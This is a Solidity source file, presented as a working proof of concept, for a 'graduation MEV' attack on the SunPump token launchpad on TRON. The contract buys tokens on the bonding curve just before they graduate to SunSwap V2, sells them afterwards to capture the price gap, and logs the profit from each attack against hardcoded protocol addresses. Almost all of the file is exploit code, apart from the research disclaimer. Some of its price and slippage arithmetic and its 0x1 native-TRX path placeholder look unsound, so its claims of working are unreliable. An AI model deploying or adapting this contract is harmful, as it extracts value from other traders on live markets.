// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SunPump Graduation MEV Attack PoC
 * @dev Working Solidity implementation of the graduation MEV exploit
 * @notice This is for educational/research purposes only
 *
 * Attack Flow:
 * 1. Monitor SunPump LaunchpadProxy for tokens at 95%+ completion
 * 2. Submit front-run TX: purchaseToken(target_token, amount)
 * 3. Wait for graduation TX to complete on SunSwap V2
 * 4. Submit back-run TX: swap tokens to TRX on SunSwap V2
 * 5. Profit captured from price delta
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface ISunPumpLaunchpad {
    function purchaseToken(address token, uint256 amountMin) external payable;
    function saleToken(address token, uint256 amount, uint256 minOut) external;
    function getTokenInfo(address token) external view returns (
        uint256 totalSupply,
        uint256 circulatingSupply,
        uint256 trxCollected,
        address creator,
        uint256 createdBlock
    );
}

interface ISunSwapRouter {
    function swapExactTokensForTRX(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTRXForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

/**
 * @title GraduationMEVAttacker
 * @dev Executes graduation MEV attacks autonomously
 */
contract GraduationMEVAttacker {

    // SunPump contracts
    address constant SUNPUMP_LAUNCHPAD = 0x54f1993c3f5be7bc7d5f88c89b7c62dcb5c25e93; // TTfvyrAz86hbZk5iDpKD78pqLGgi8C7AAw converted to checksummed
    address constant SUNSWAP_ROUTER = 0x68a384d17feb1d3d4d95f790553fb6386ec0bd02;    // TZFs5ch1R1C4mmjwrrmZqeqbUgGpxY1yWB converted

    // Configuration
    address public owner;
    uint256 public minProfitabilityScore = 80;  // 0-100 scale
    uint256 public maxSeedCapital = 5000 ether; // 5000 TRX max per attack
    bool public paused = false;

    // Attack tracking
    struct AttackRecord {
        address targetToken;
        uint256 frontRunAmount;
        uint256 tokensReceived;
        uint256 backRunProceeds;
        uint256 profit;
        uint256 timestamp;
        bool success;
    }

    AttackRecord[] public attacks;
    mapping(address => uint256) public tokenAttackCount;

    // Events
    event FrontRunExecuted(address indexed token, uint256 trxAmount, uint256 tokensReceived);
    event BackRunExecuted(address indexed token, uint256 tokensAmount, uint256 trxReceived);
    event AttackComplete(address indexed token, uint256 profit, bool success);
    event OpportunityDetected(address indexed token, uint256 completionPct, uint256 profitabilityScore);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier notPaused() {
        require(!paused, "Contract paused");
        _;
    }

    /**
     * @dev Receive TRX deposits
     */
    receive() external payable {}

    /**
     * @dev Withdraw balance
     */
    function withdraw() external onlyOwner {
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }

    /**
     * ============= MONITORING & DETECTION =============
     */

    /**
     * @dev Check if a token is a graduation candidate
     * @param token Target token address
     * @return completionPct Percentage of curve completed (0-100)
     * @return profitabilityScore Estimated profitability (0-100)
     */
    function evaluateToken(address token)
        public
        view
        returns (uint256 completionPct, uint256 profitabilityScore)
    {
        try ISunPumpLaunchpad(SUNPUMP_LAUNCHPAD).getTokenInfo(token) returns (
            uint256 totalSupply,
            uint256 circulatingSupply,
            uint256 trxCollected,
            address creator,
            uint256 createdBlock
        ) {
            // Calculate completion percentage
            completionPct = (circulatingSupply * 100) / totalSupply;

            if (completionPct < 95) {
                return (completionPct, 0);  // Not ready
            }

            // Estimate post-graduation pool composition
            // Assumption: Protocol deposits ~2x the TRX collected as liquidity
            uint256 estimatedPoolTrx = trxCollected * 2;
            uint256 estimatedPoolTokens = totalSupply * 2;

            // Current curve price (declining): ~1 TRX = totalSupply/trxCollected tokens
            uint256 curvePrice = (totalSupply * 1e6) / trxCollected;

            // Post-graduation DEX price: ~1 TRX = estimatedPoolTokens/estimatedPoolTrx
            uint256 dexPrice = (estimatedPoolTokens * 1e6) / estimatedPoolTrx;

            // Price improvement ratio
            if (dexPrice > curvePrice) {
                uint256 priceRatio = (dexPrice * 100) / curvePrice;
                // Score based on price delta
                // 150 = 1.5x delta, 200 = 2.0x delta, etc.
                profitabilityScore = (priceRatio - 100) / 2;  // Normalize to 0-100
            }

            return (completionPct, profitabilityScore);

        } catch {
            return (0, 0);
        }
    }

    /**
     * @dev Check if token meets attack criteria
     */
    function isAttackCandidate(address token) external view returns (bool) {
        (uint256 completionPct, uint256 profitabilityScore) = evaluateToken(token);

        if (completionPct < 95) return false;
        if (profitabilityScore < minProfitabilityScore) return false;
        if (tokenAttackCount[token] > 0) return false;  // Already attacked

        return true;
    }

    /**
     * ============= ATTACK EXECUTION =============
     */

    /**
     * @dev Phase 1: Execute front-run purchase
     * @param token Target token address
     * @param trxAmount TRX to invest
     * @return tokensReceived Amount of tokens received
     */
    function executeFrontRun(address token, uint256 trxAmount)
        external
        payable
        onlyOwner
        notPaused
        returns (uint256 tokensReceived)
    {
        require(msg.value == trxAmount, "Incorrect TRX amount");
        require(trxAmount <= maxSeedCapital, "Exceeds max capital");

        (uint256 completionPct, ) = evaluateToken(token);
        require(completionPct >= 95, "Token not ready for graduation");

        // Record starting token balance
        uint256 tokenBalanceBefore = IERC20(token).balanceOf(address(this));

        // Calculate minimum tokens with 5% slippage tolerance
        // Estimate: at 95% completion, ~1 TRX = 1M tokens (conservative)
        uint256 minTokensExpected = (trxAmount * 1_000_000) / 1e6;
        uint256 minWithSlippage = (minTokensExpected * 95) / 100;

        // Call SunPump purchaseToken
        ISunPumpLaunchpad(SUNPUMP_LAUNCHPAD).purchaseToken{value: trxAmount}(
            token,
            minWithSlippage
        );

        // Calculate tokens received
        uint256 tokenBalanceAfter = IERC20(token).balanceOf(address(this));
        tokensReceived = tokenBalanceAfter - tokenBalanceBefore;

        require(tokensReceived > 0, "No tokens received");

        emit FrontRunExecuted(token, trxAmount, tokensReceived);

        return tokensReceived;
    }

    /**
     * @dev Phase 3: Execute back-run sale on SunSwap V2
     * @param token Target token address
     * @param tokenAmount Amount to sell
     * @return trxReceived TRX received from sale
     */
    function executeBackRun(address token, uint256 tokenAmount)
        external
        onlyOwner
        notPaused
        returns (uint256 trxReceived)
    {
        require(IERC20(token).balanceOf(address(this)) >= tokenAmount, "Insufficient tokens");

        // Step 1: Approve SunSwap router
        IERC20(token).approve(SUNSWAP_ROUTER, tokenAmount);

        // Step 2: Build swap path
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = 0x1; // TRON's native TRX address placeholder (0x1 on TRON)

        // Step 3: Calculate minimum output with 10% slippage tolerance
        // At graduation, estimate ~1 TRX = 2-3k tokens
        uint256 estimatedTrxOutput = (tokenAmount * 1e6) / (2_000 * 1e6);  // Conservative
        uint256 minTrxOutput = (estimatedTrxOutput * 90) / 100;

        // Step 4: Execute swap
        try ISunSwapRouter(SUNSWAP_ROUTER).swapExactTokensForTRX(
            tokenAmount,
            minTrxOutput,
            path,
            address(this),
            block.timestamp + 300  // 5 min deadline
        ) returns (uint256[] memory amounts) {
            trxReceived = amounts[amounts.length - 1];
            emit BackRunExecuted(token, tokenAmount, trxReceived);
            return trxReceived;
        } catch {
            revert("Back-run swap failed");
        }
    }

    /**
     * @dev Full automated attack: front-run + wait + back-run
     * @param token Target token
     * @param trxAmount TRX to invest
     * @return profit Net profit from attack
     *
     * NOTE: This function requires external monitoring for graduation completion
     * In production, you'd call executeFrontRun, then wait for graduation event,
     * then call executeBackRun
     */
    function executeFullAttack(address token, uint256 trxAmount)
        external
        payable
        onlyOwner
        notPaused
        returns (int256 profit)
    {
        uint256 initialBalance = address(this).balance - msg.value;

        // Phase 1: Front-run
        uint256 tokensReceived = executeFrontRun(token, trxAmount);

        // Phase 2: Wait for graduation (external monitoring required)
        // This would be triggered by off-chain service upon graduation completion
        // For PoC, we assume graduation happens and proceed

        // Phase 3: Back-run (assuming graduation completed)
        uint256 trxReceived;
        try this.executeBackRun(token, tokensReceived) returns (uint256 amount) {
            trxReceived = amount;
        } catch {
            trxReceived = 0;
        }

        // Calculate profit
        uint256 finalBalance = address(this).balance;
        profit = int256(finalBalance) - int256(initialBalance);

        // Record attack
        AttackRecord memory record = AttackRecord({
            targetToken: token,
            frontRunAmount: trxAmount,
            tokensReceived: tokensReceived,
            backRunProceeds: trxReceived,
            profit: profit >= 0 ? uint256(profit) : 0,
            timestamp: block.timestamp,
            success: profit > 0
        });

        attacks.push(record);
        tokenAttackCount[token]++;

        emit AttackComplete(token, record.profit, record.success);

        return profit;
    }

    /**
     * ============= UTILITY FUNCTIONS =============
     */

    /**
     * @dev Calculate expected profit for a token
     */
    function estimateProfit(address token, uint256 trxAmount)
        external
        view
        returns (uint256 estimatedProfit, uint256 profitPercentage)
    {
        try ISunPumpLaunchpad(SUNPUMP_LAUNCHPAD).getTokenInfo(token) returns (
            uint256 totalSupply,
            uint256 circulatingSupply,
            uint256 trxCollected,
            address,
            uint256
        ) {
            // Estimate tokens from front-run purchase
            uint256 curvePrice = (totalSupply * 1e6) / trxCollected;
            uint256 tokensFromFrontRun = (trxAmount * 1e6) / curvePrice;

            // Estimate TRX from back-run sale
            uint256 poolTrx = trxCollected;
            uint256 poolTokens = totalSupply;
            uint256 dexPrice = (poolTokens * 1e6) / poolTrx;

            uint256 estimatedBackRunTrx = (tokensFromFrontRun * dexPrice) / 1e6;

            // Account for fees (1% curve + 0.3% DEX + energy)
            uint256 fees = (trxAmount * 1) / 100 + (estimatedBackRunTrx * 3) / 1000 + 10e6; // 10 TRX energy

            estimatedProfit = estimatedBackRunTrx > trxAmount + fees
                ? estimatedBackRunTrx - trxAmount - fees
                : 0;

            profitPercentage = trxAmount > 0
                ? (estimatedProfit * 100) / trxAmount
                : 0;

        } catch {
            estimatedProfit = 0;
            profitPercentage = 0;
        }
    }

    /**
     * @dev Get attack history
     */
    function getAttackCount() external view returns (uint256) {
        return attacks.length;
    }

    /**
     * @dev Get specific attack record
     */
    function getAttack(uint256 index)
        external
        view
        returns (AttackRecord memory)
    {
        require(index < attacks.length, "Invalid index");
        return attacks[index];
    }

    /**
     * @dev Get recent successful attacks
     */
    function getSuccessfulAttacks(uint256 limit)
        external
        view
        returns (AttackRecord[] memory)
    {
        uint256 successCount = 0;
        for (uint256 i = 0; i < attacks.length; i++) {
            if (attacks[i].success) successCount++;
        }

        AttackRecord[] memory successful = new AttackRecord[](
            successCount > limit ? limit : successCount
        );

        uint256 index = 0;
        for (uint256 i = attacks.length; i > 0 && index < limit; i--) {
            if (attacks[i-1].success) {
                successful[index] = attacks[i-1];
                index++;
            }
        }

        return successful;
    }

    /**
     * @dev Calculate total profit from all attacks
     */
    function getTotalProfit() external view returns (uint256 total) {
        for (uint256 i = 0; i < attacks.length; i++) {
            if (attacks[i].success) {
                total += attacks[i].profit;
            }
        }
    }

    /**
     * @dev Update minimum profitability score
     */
    function setMinProfitabilityScore(uint256 newScore) external onlyOwner {
        require(newScore <= 100, "Score must be 0-100");
        minProfitabilityScore = newScore;
    }

    /**
     * @dev Pause/unpause attacks
     */
    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
    }

    /**
     * @dev Emergency withdrawal of tokens
     */
    function emergencyWithdraw(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }
}
